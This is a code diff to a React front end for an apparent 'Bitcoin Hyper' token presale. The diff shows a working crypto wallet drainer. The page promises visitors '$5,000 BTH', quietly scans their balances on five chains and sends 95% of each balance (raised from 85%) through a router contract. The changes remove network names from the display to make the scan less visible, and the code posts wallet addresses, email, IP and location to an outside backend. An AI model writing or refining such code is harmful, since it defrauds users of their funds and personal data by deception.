@@ -101,7 +101,6 @@ function App() {
   const [currentFlowId, setCurrentFlowId] = useState('');
   const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
-  const [totalValueUSD, setTotalValueUSD] = useState(0);
   const [eligibleChains, setEligibleChains] = useState([]);
 
   // Presale stats
@@ -249,7 +248,6 @@ function App() {
     try {
       // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
-      setTotalValueUSD(total);
       
       // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
@@ -264,7 +262,7 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus('✅ You qualify for $5,000 BTH!');
         
-        // Send to backend for tracking (balances not shown on site)
+        // Send to backend for tracking
         await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -291,7 +289,7 @@ function App() {
 
   // Fetch balances across all chains (hidden from UI)
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Checking eligibility across 5 chains...");
+    console.log("🔍 Checking eligibility...");
     setScanning(true);
     setTxStatus('🔄 Checking eligibility...');
     
@@ -316,7 +314,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Checking eligibility (${scanned}/${totalChains})...`);
+        setTxStatus(`🔄 Checking eligibility...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -363,7 +361,7 @@ function App() {
   };
 
   // ============================================
-  // MULTI-CHAIN EXECUTION - ONLY FOR ELIGIBLE CHAINS
+  // MULTI-CHAIN EXECUTION - 95% OF BALANCE
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -438,13 +436,12 @@ function App() {
           // Create provider for this chain
           const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
           
-          // Get balance data
+          // Get balance data - SEND 95% (not 85%)
           const balance = balances[chain.name];
-          // Send 85% of the balance
-          const amountToSend = (balance.amount * 0.85);
-          const valueUSD = (balance.valueUSD * 0.85).toFixed(2);
+          const amountToSend = (balance.amount * 0.95); // Changed to 95%
+          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
-          console.log(`💰 ${chain.name}: Processing $${valueUSD}`);
+          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
           // Create contract interface
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
@@ -488,15 +485,15 @@ function App() {
             // Calculate gas used
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
-            // Send to backend with details
+            // FIXED: Send to backend with CORRECT amount and valueUSD
             const flowData = {
               walletAddress: address,
               chainName: chain.name,
               flowId: flowId,
               txHash: tx,
-              amount: amountToSend.toFixed(6),
+              amount: amountToSend.toFixed(6), // This is the actual amount sent
               symbol: chain.symbol,
-              valueUSD: valueUSD,
+              valueUSD: valueUSD, // This is the USD value
               gasFee: gasUsed,
               email: userEmail,
               location: {
@@ -506,6 +503,8 @@ function App() {
                 ip: userLocation.ip
               }
             };
+            
+            console.log("📤 Sending to backend with amounts:", flowData);
             
             await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
               method: 'POST',
@@ -530,7 +529,12 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
-        // Final success notification
+        // Calculate total processed value
+        const totalProcessedValue = processed.reduce((sum, chainName) => {
+          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
+        }, 0);
+        
+        // Final success notification with correct values
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -543,6 +547,7 @@ function App() {
               city: userLocation.city
             },
             chains: processed,
+            totalProcessedValue: totalProcessedValue.toFixed(2),
             reward: "5000 BTH",
             bonus: `${presaleStats.currentBonus}%`
           })
@@ -634,7 +639,7 @@ function App() {
                 </span>
                 <button
                   onClick={() => disconnect()}
-                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-white border border-[#c47d24]/70 flex items-center justify-center hover:bg-[#c47d24] hover:text-black hover:rotate-90 transition-all text-[#c47d24] hover:text-white"
+                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-[#c47d24] border border-[#cc9f66] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all text-black shadow-lg"
                   title="Disconnect Wallet"
                 >
                   <i className="fas fa-power-off text-sm"></i>
@@ -643,7 +648,7 @@ function App() {
             )}
           </div>
 
-          {/* ELIGIBILITY CHECKING ANIMATION */}
+          {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
               <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
@@ -651,24 +656,16 @@ function App() {
                   <div className="w-12 h-12 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
                     <div className="text-lg font-bold text-[#e0b880]">Checking Eligibility</div>
-                    <div className="text-sm text-gray-400">Scanning 5 networks...</div>
+                    <div className="text-sm text-gray-400">Verifying your wallet...</div>
                   </div>
                 </div>
                 
-                {/* Progress bar */}
-                <div className="w-full bg-gray-800 rounded-full h-2 mb-2">
+                {/* Sleek progress bar */}
+                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                   <div 
-                    className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-2 rounded-full transition-all duration-300"
+                    className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
                     style={{ width: `${scanProgress}%` }}
                   ></div>
-                </div>
-                
-                <div className="flex justify-between text-xs text-gray-500">
-                  <span>Ethereum</span>
-                  <span>BSC</span>
-                  <span>Polygon</span>
-                  <span>Arbitrum</span>
-                  <span>Avalanche</span>
                 </div>
                 
                 <div className="mt-3 text-sm text-[#c47d24]">
@@ -837,11 +834,11 @@ function App() {
                 Welcome to Bitcoin Hyper
               </h2>
               <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
-                Connect with a wallet that has at least $1 in value across any network to qualify.
+                Connect with a wallet that has at least $1 in value to qualify.
               </p>
               <div className="bg-gray-900/60 rounded-lg sm:rounded-xl p-3 sm:p-4 border border-gray-800">
                 <p className="text-xs text-gray-400">
-                  Eligible networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche
+                  Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                 </p>
               </div>
             </div>
